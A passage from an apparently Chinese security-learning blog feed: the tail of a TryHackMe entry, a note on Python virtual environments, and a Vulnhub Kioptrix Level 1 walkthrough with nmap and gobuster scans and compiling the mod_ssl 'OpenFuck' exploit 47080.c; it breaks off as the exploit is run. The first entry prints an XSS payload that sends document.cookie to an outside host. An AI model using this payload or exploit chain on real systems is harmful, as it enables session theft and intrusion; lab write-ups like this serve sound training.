bash">&lt;/textarea&gt;&lt;script&gt;fetch(<span class="hljs-string">&#x27;http://10.10.107.206:1234?cookie=&#x27;</span> + btoa(document.cookie) );&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>别的没啥值得说的,就一个类似反弹shell的东西</p>]]></content>
    
    
    <categories>
      
      <category>thm</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>虚拟环境</title>
    <link href="/2023/08/22/%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/"/>
    <url>/2023/08/22/%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/</url>
    
    <content type="html"><![CDATA[<p>简单来说就是创造一个沙箱环境,在git clone很多个项目之后,每个项目所需要的各个服务版本可能有冲突,就在每个克隆下来的目录下创建一个虚拟环境用于下载依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">//创建虚拟环境<br>python3 -m venv venv //win系统就是python -m venv venv<br>//win启动虚拟环境<br>venv\Scripts\activate<br>//linux启动<br><span class="hljs-built_in">source</span> venv/bin/activate<br>//安装依赖<br>pip install -r requirements.txt<br>//退出虚拟环境<br>deactivate<br></code></pre></td></tr></table></figure><h2 id="linux-python切换版本"><a href="#linux-python切换版本" class="headerlink" title="linux_python切换版本"></a>linux_python切换版本</h2><p>pyhon –version中的python链接到python3,python3链接到python3.11,python3.11才是可执行文件,同理python2会链接到python2.7,只要修改python链接的目录就可以起到修改python版本的效果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">alias</span> python=<span class="hljs-string">&#x27;/usr/bin/python2&#x27;</span>    //这个是暂时的,退出当前shell就会修改回来<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CS基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Kioptrix_level_1</title>
    <link href="/2023/08/22/Kioptrix-level-1/"/>
    <url>/2023/08/22/Kioptrix-level-1/</url>
    
    <content type="html"><![CDATA[<h1 id="vulnhub初级靶场"><a href="#vulnhub初级靶场" class="headerlink" title="vulnhub初级靶场"></a>vulnhub初级靶场</h1><p><code>https://www.vulnhub.com/entry/kioptrix-level-1-1,22/</code></p><h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><p>下载,解压,nat模式,先kali扫一遍内网,再开机扫一遍,确定靶机ip</p><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230822222618.png"></p><p>靶机ip 192.168.49.129<br>-sn是ping测试,不会探查端口,更快更隐蔽一些,-sP即有ping测试又探查端口,噪音比较大,正常来说还是-sn比较好</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><p>nmap -p- 192.168.49.129<br>全端口扫描<br><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230822223921.png"><br>这里发现了139端口,没见过,但是博主说这是个常见端口,就查了一下信息</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown">端口139通常用于 Windows 系统上的 NetBIOS 服务。NetBIOS（Network Basic Input/Output System）是一种早期的网络通信协议，用于在局域网中进行网络通信、文件和打印机共享等。它提供了一种在局域网内发现其他计算机、共享资源和进行通信的机制。<br>具体来说，端口139用于 NetBIOS 会话服务。通过该端口，计算机可以进行以下操作：<br><span class="hljs-bullet">1.</span> 文件和打印机共享： 端口139允许计算机共享文件夹和打印机，使其他计算机可以访问这些共享资源。<br><span class="hljs-bullet">2.</span> 通信和消息传递： NetBIOS 还可以用于计算机之间的通信和消息传递。它可以在局域网内广播消息，以便进行发现和通信。<br></code></pre></td></tr></table></figure><p>干的事类似白天做的那个<code>python -m http.server</code>,就是传文件,发信息,网络通信共享资源的</p><p>其实这一步不做也可以,但是先扫出来端口更有条理一些</p><h3 id="此时获得的信息"><a href="#此时获得的信息" class="headerlink" title="此时获得的信息"></a>此时获得的信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">ip<br>192.168.49.129<br><br>端口开放<br>22 ssh<br>80 <br>111 rpcbind<br>139 文件传输资源共享<br>443<br>1024 kdm<br></code></pre></td></tr></table></figure><h2 id="系统版本信息全收集"><a href="#系统版本信息全收集" class="headerlink" title="系统版本信息全收集"></a>系统版本信息全收集</h2><p><code>nmap -sV -A 192.168.49.129</code><br>-sV 版本信息<br>-A 版本,操作系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─<span class="hljs-comment"># nmap -sV -A 192.168.49.129</span><br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-22 10:49 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.49.129<br>Host is up (0.0022s latency).<br>Not shown: 994 closed tcp ports (reset)<br>PORT     STATE SERVICE     VERSION<br>22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)<br>| ssh-hostkey: <br>|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:<span class="hljs-built_in">df</span>:5e:6f:64:86 (RSA1)<br>|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)<br>|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)<br>|_sshv1: Server supports SSHv1<br>80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/<span class="hljs-number">2.8</span>.<span class="hljs-number">4</span> OpenSSL/<span class="hljs-number">0.9</span>.<span class="hljs-number">6</span>b)<br>|_http-server-header: Apache/<span class="hljs-number">1.3</span>.<span class="hljs-number">20</span> (Unix)  (Red-Hat/Linux) mod_ssl/<span class="hljs-number">2.8</span>.<span class="hljs-number">4</span> OpenSSL/<span class="hljs-number">0.9</span>.<span class="hljs-number">6</span>b<br>|_http-title: Test Page for the Apache Web Server on Red Hat Linux<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br><span class="hljs-number">111</span>/tcp  open  rpcbind     <span class="hljs-number">2</span> (RPC #<span class="hljs-number">100000</span>)<br>| rpcinfo: <br>|   program version    port/proto  service<br>|   <span class="hljs-number">100000</span>  <span class="hljs-number">2</span>            <span class="hljs-number">111</span>/tcp   rpcbind<br>|   <span class="hljs-number">100000</span>  <span class="hljs-number">2</span>            <span class="hljs-number">111</span>/udp   rpcbind<br>|   <span class="hljs-number">100024</span>  <span class="hljs-number">1</span>           <span class="hljs-number">1024</span>/tcp   status<br>|_  <span class="hljs-number">100024</span>  <span class="hljs-number">1</span>           <span class="hljs-number">1024</span>/udp   status<br><span class="hljs-number">139</span>/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)<br><span class="hljs-number">443</span>/tcp  open  ssl/https   Apache/<span class="hljs-number">1.3</span>.<span class="hljs-number">20</span> (Unix)  (Red-Hat/Linux) mod_ssl/<span class="hljs-number">2.8</span>.<span class="hljs-number">4</span> OpenSSL/<span class="hljs-number">0.9</span>.<span class="hljs-number">6</span>b<br>| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--<br>| Not valid before: <span class="hljs-number">2009</span>-<span class="hljs-number">09</span>-<span class="hljs-number">26</span>T09:<span class="hljs-number">32</span>:<span class="hljs-number">06</span><br>|_Not valid after:  <span class="hljs-number">2010</span>-<span class="hljs-number">09</span>-<span class="hljs-number">26</span>T09:<span class="hljs-number">32</span>:<span class="hljs-number">06</span><br>|_http-title: <span class="hljs-number">400</span> Bad Request<br>|_http-server-header: Apache/<span class="hljs-number">1.3</span>.<span class="hljs-number">20</span> (Unix)  (Red-Hat/Linux) mod_ssl/<span class="hljs-number">2.8</span>.<span class="hljs-number">4</span> OpenSSL/<span class="hljs-number">0.9</span>.<span class="hljs-number">6</span>b<br>| sslv2: <br>|   SSLv2 supported<br>|   ciphers: <br>|     SSL2_DES_64_CBC_WITH_MD5<br>|     SSL2_RC4_64_WITH_MD5<br>|     SSL2_RC4_128_WITH_MD5<br>|     SSL2_DES_192_EDE3_CBC_WITH_MD5<br>|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5<br>|     SSL2_RC2_128_CBC_WITH_MD5<br>|_    SSL2_RC4_128_EXPORT40_WITH_MD5<br>|_ssl-date: <span class="hljs-number">2023</span>-<span class="hljs-number">08</span>-<span class="hljs-number">22</span>T14:<span class="hljs-number">51</span>:<span class="hljs-number">55</span>+<span class="hljs-number">00</span>:<span class="hljs-number">00</span>; +<span class="hljs-number">1</span>m52s from scanner time.<br><span class="hljs-number">1024</span>/tcp open  status      <span class="hljs-number">1</span> (RPC #<span class="hljs-number">100024</span>)<br>MAC Address: <span class="hljs-number">00</span>:<span class="hljs-number">0</span>C:<span class="hljs-number">29</span>:<span class="hljs-number">7</span>C:<span class="hljs-number">3</span>A:<span class="hljs-number">16</span> (VMware)<br>Device type: general purpose<br>Running: Linux <span class="hljs-number">2.4</span>.X<br>OS CPE: cpe:/o:linux:linux_kernel:<span class="hljs-number">2.4</span><br>OS details: Linux <span class="hljs-number">2.4</span>.<span class="hljs-number">9</span> - <span class="hljs-number">2.4</span>.<span class="hljs-number">18</span> (likely embedded)<br>Network Distance: <span class="hljs-number">1</span> hop<br><br>Host script results:<br>|_smb2-time: Protocol negotiation failed (SMB2)<br>|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br>|_clock-skew: <span class="hljs-number">1</span>m51s<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br><span class="hljs-number">1</span>   <span class="hljs-number">2.23</span> ms <span class="hljs-number">192.168</span>.<span class="hljs-number">49.129</span><br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">26.26</span> seconds<br></code></pre></td></tr></table></figure><p>这里一张图截屏截不下,干脆直接复制过来吧</p><p>简单分析一下,red hat系统,使用apache服务</p><h2 id="apache路线"><a href="#apache路线" class="headerlink" title="apache路线"></a>apache路线</h2><h3 id="进站"><a href="#进站" class="headerlink" title="进站"></a>进站</h3><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230822230853.png"></p><p>看了一圈没发现什么有用信息,几个路径也访问不了<br>扫一下目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> --url http://192.168.49.129 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt<br></code></pre></td></tr></table></figure><p>(这里很奇怪,系统没下gobuster,也没有SecLists的字典只能先都下下来)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt install gobuster<br>git <span class="hljs-built_in">clone</span> https://github.com/danielmiessler/SecLists.git<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230823000114.png"></p><p>试了下都没什么发现,要么权限不够进不去,要么就是跳转到红帽官网的页面了</p><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230823000627.png"></p><p>apache版本是1.3.20<img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230823001536.png"></p><p>这里的1.3.20是对应着servelt的版本号,可以看出版本非常老旧了,那么就有目标了,搜索apache低版本相关的漏洞</p><h3 id="漏洞提权"><a href="#漏洞提权" class="headerlink" title="漏洞提权"></a>漏洞提权</h3><p><code>searchsploit mod_ssl</code><br>mod_ssl是apache HTTP 服务器的一个模块searchsploit是在exploit database(漏洞库)中搜索,这里也可以直接在<a href="https://www.rapid7.com/db/">https://www.rapid7.com/db/</a> 在线搜索,不过在kali里搜会出现相关漏洞路径,更方便一些(&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits)<br><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230823003027.png"></p><p>在官网查到最新版本是这一条</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Apache mod_ssl &lt; 2.8.7 OpenSSL - <span class="hljs-string">&#x27;OpenFuckV2.c&#x27;</span> Remote Buffer Overflow (2)|unix/remote/47080.c<br></code></pre></td></tr></table></figure><p>给他copy到桌面方便操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/usr/share/exploitdb/exploits]<br>└─<span class="hljs-comment"># cp unix/remote/47080.c /root/Desktop</span><br></code></pre></td></tr></table></figure><p>这里打开脚本,注释里显示需要安装依赖,那么就开个虚拟环境安装依赖<img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230823113014.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m venv venv //我kali的python是python2<br><span class="hljs-built_in">source</span> venv/bin/activate<br>apt-get install libssl-dev<br>gcc -o 47080 47080.c -lcrypto<br>//gcc是编译器,-o 47080是生成名为47080的可执行文件,47080.c是需要编译的文件名字,-lcrypto是要引用的库,这个来自依赖的下一行<br><br>//内容<br>//博主说这是编译成功了,但乍一看就像失败了一样<br>┌──(venv)─(root㉿kali)-[~/Desktop/vulnhub]<br>└─<span class="hljs-comment"># gcc -o 47080 47080.c -lcrypto</span><br>47080.c: In <span class="hljs-keyword">function</span> ‘read_ssl_packet’:<br>47080.c:534:17: warning: ‘RC4’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]<br>  534 |                 RC4(ssl-&gt;rc4_read_key, rec_len, buf, buf);<br>      |                 ^~~<br>In file included from 47080.c:26:<br>/usr/include/openssl/rc4.h:37:28: note: declared here<br>   37 | OSSL_DEPRECATEDIN_3_0 void RC4(RC4_KEY *key, size_t len,<br>      |                            ^~~<br>47080.c: In <span class="hljs-keyword">function</span> ‘send_ssl_packet’:<br>47080.c:583:17: warning: ‘MD5_Init’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]<br>  583 |                 MD5_Init(&amp;ctx);<br>      |                 ^~~~~~~~<br>In file included from 47080.c:27:<br>/usr/include/openssl/md5.h:49:27: note: declared here<br>   49 | OSSL_DEPRECATEDIN_3_0 int MD5_Init(MD5_CTX *c);<br>      |                           ^~~~~~~~<br>47080.c:584:17: warning: ‘MD5_Update’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]<br>  584 |                 MD5_Update(&amp;ctx, ssl-&gt;write_key, RC4_KEY_LENGTH);<br>      |                 ^~~~~~~~~~<br>/usr/include/openssl/md5.h:50:27: note: declared here<br>   50 | OSSL_DEPRECATEDIN_3_0 int MD5_Update(MD5_CTX *c, const void *data, size_t len);<br>      |                           ^~~~~~~~~~<br>47080.c:585:17: warning: ‘MD5_Update’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]<br>  585 |                 MD5_Update(&amp;ctx, rec, rec_len);<br>      |                 ^~~~~~~~~~<br>/usr/include/openssl/md5.h:50:27: note: declared here<br>   50 | OSSL_DEPRECATEDIN_3_0 int MD5_Update(MD5_CTX *c, const void *data, size_t len);<br>      |                           ^~~~~~~~~~<br>47080.c:586:17: warning: ‘MD5_Update’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]<br>  586 |                 MD5_Update(&amp;ctx, &amp;<span class="hljs-built_in">seq</span>, 4);<br>      |                 ^~~~~~~~~~<br>/usr/include/openssl/md5.h:50:27: note: declared here<br>   50 | OSSL_DEPRECATEDIN_3_0 int MD5_Update(MD5_CTX *c, const void *data, size_t len);<br>      |                           ^~~~~~~~~~<br>47080.c:587:17: warning: ‘MD5_Final’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]<br>  587 |                 MD5_Final(p, &amp;ctx);<br>      |                 ^~~~~~~~~<br>/usr/include/openssl/md5.h:51:27: note: declared here<br>   51 | OSSL_DEPRECATEDIN_3_0 int MD5_Final(unsigned char *md, MD5_CTX *c);<br>      |                           ^~~~~~~~~<br>47080.c:594:17: warning: ‘RC4’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]<br>  594 |                 RC4(ssl-&gt;rc4_write_key, tot_len, &amp;buf[2], &amp;buf[2]);<br>      |                 ^~~<br>/usr/include/openssl/rc4.h:37:28: note: declared here<br>   37 | OSSL_DEPRECATEDIN_3_0 void RC4(RC4_KEY *key, size_t len,<br>      |                            ^~~<br>47080.c: In <span class="hljs-keyword">function</span> ‘send_client_master_key’:<br>47080.c:748:9: warning: ‘EVP_PKEY_get1_RSA’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]<br>  748 |         <span class="hljs-keyword">if</span> (EVP_PKEY_get1_RSA(pkey) == NULL) &#123;<br>      |         ^~<br>In file included from /usr/include/openssl/x509.h:29,<br>                 from /usr/include/openssl/ssl.h:31,<br>                 from 47080.c:21:<br>/usr/include/openssl/evp.h:1348:16: note: declared here<br> 1348 | struct rsa_st *EVP_PKEY_get1_RSA(EVP_PKEY *pkey);<br>      |                ^~~~~~~~~~~~~~~~~<br>47080.c:754:9: warning: ‘RSA_public_encrypt’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]<br>  754 |         encrypted_key_length = RSA_public_encrypt(RC4_KEY_LENGTH, ssl-&gt;master_key, &amp;buf[10], EVP_PKEY_get1_RSA(pkey), RSA_PKCS1_PADDING);<br>      |         ^~~~~~~~~~~~~~~~~~~~<br>In file included from /usr/include/openssl/x509.h:36:<br>/usr/include/openssl/rsa.h:282:5: note: declared here<br>  282 | int RSA_public_encrypt(int flen, const unsigned char *from, unsigned char *to,<br>      |     ^~~~~~~~~~~~~~~~~~<br>47080.c:754:9: warning: ‘EVP_PKEY_get1_RSA’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]<br>  754 |         encrypted_key_length = RSA_public_encrypt(RC4_KEY_LENGTH, ssl-&gt;master_key, &amp;buf[10], EVP_PKEY_get1_RSA(pkey), RSA_PKCS1_PADDING);<br>      |         ^~~~~~~~~~~~~~~~~~~~<br>/usr/include/openssl/evp.h:1348:16: note: declared here<br> 1348 | struct rsa_st *EVP_PKEY_get1_RSA(EVP_PKEY *pkey);<br>      |                ^~~~~~~~~~~~~~~~~<br>47080.c: In <span class="hljs-keyword">function</span> ‘generate_key_material’:<br>47080.c:791:17: warning: ‘MD5_Init’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]<br>  791 |                 MD5_Init(&amp;ctx);<br>      |                 ^~~~~~~~<br>/usr/include/openssl/md5.h:49:27: note: declared here<br>   49 | OSSL_DEPRECATEDIN_3_0 int MD5_Init(MD5_CTX *c);<br>      |                           ^~~~~~~~<br>47080.c:793:17: warning: ‘MD5_Update’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]<br>  793 |                 MD5_Update(&amp;ctx,ssl-&gt;master_key,RC4_KEY_LENGTH);<br>      |                 ^~~~~~~~~~<br>/usr/include/openssl/md5.h:50:27: note: declared here<br>   50 | OSSL_DEPRECATEDIN_3_0 int MD5_Update(MD5_CTX *c, const void *data, size_t len);<br>      |                           ^~~~~~~~~~<br>47080.c:794:17: warning: ‘MD5_Update’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]<br>  794 |                 MD5_Update(&amp;ctx,&amp;c,1);<br>      |                 ^~~~~~~~~~<br>/usr/include/openssl/md5.h:50:27: note: declared here<br>   50 | OSSL_DEPRECATEDIN_3_0 int MD5_Update(MD5_CTX *c, const void *data, size_t len);<br>      |                           ^~~~~~~~~~<br>47080.c:796:17: warning: ‘MD5_Update’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]<br>  796 |                 MD5_Update(&amp;ctx,ssl-&gt;challenge,CHALLENGE_LENGTH);<br>      |                 ^~~~~~~~~~<br>/usr/include/openssl/md5.h:50:27: note: declared here<br>   50 | OSSL_DEPRECATEDIN_3_0 int MD5_Update(MD5_CTX *c, const void *data, size_t len);<br>      |                           ^~~~~~~~~~<br>47080.c:797:17: warning: ‘MD5_Update’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]<br>  797 |                 MD5_Update(&amp;ctx,ssl-&gt;conn_id, ssl-&gt;conn_id_length);<br>      |                 ^~~~~~~~~~<br>/usr/include/openssl/md5.h:50:27: note: declared here<br>   50 | OSSL_DEPRECATEDIN_3_0 int MD5_Update(MD5_CTX *c, const void *data, size_t len);<br>      |                           ^~~~~~~~~~<br>47080.c:798:17: warning: ‘MD5_Final’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]<br>  798 |                 MD5_Final(km,&amp;ctx);<br>      |                 ^~~~~~~~~<br>/usr/include/openssl/md5.h:51:27: note: declared here<br>   51 | OSSL_DEPRECATEDIN_3_0 int MD5_Final(unsigned char *md, MD5_CTX *c);<br>      |                           ^~~~~~~~~<br>47080.c: In <span class="hljs-keyword">function</span> ‘generate_session_keys’:<br>47080.c:807:9: warning: ‘RC4_set_key’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]<br>  807 |         RC4_set_key(ssl-&gt;rc4_read_key, RC4_KEY_LENGTH, ssl-&gt;read_key);<br>      |         ^~~~~~~~~~~<br>/usr/include/openssl/rc4.h:35:28: note: declared here<br>   35 | OSSL_DEPRECATEDIN_3_0 void RC4_set_key(RC4_KEY *key, int len,<br>      |                            ^~~~~~~~~~~<br>47080.c:811:9: warning: ‘RC4_set_key’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]<br>  811 |         RC4_set_key(ssl-&gt;rc4_write_key, RC4_KEY_LENGTH, ssl-&gt;write_key);<br>      |         ^~~~~~~~~~~<br>/usr/include/openssl/rc4.h:35:28: note: declared here<br>   35 | OSSL_DEPRECATEDIN_3_0 void RC4_set_key(RC4_KEY *key, int len,<br>      |                            ^~~~~~~~~~~<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230823113705.png">脚本已经生成,运行<code>./47080</code>执行脚本,这里不能直接47080</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span 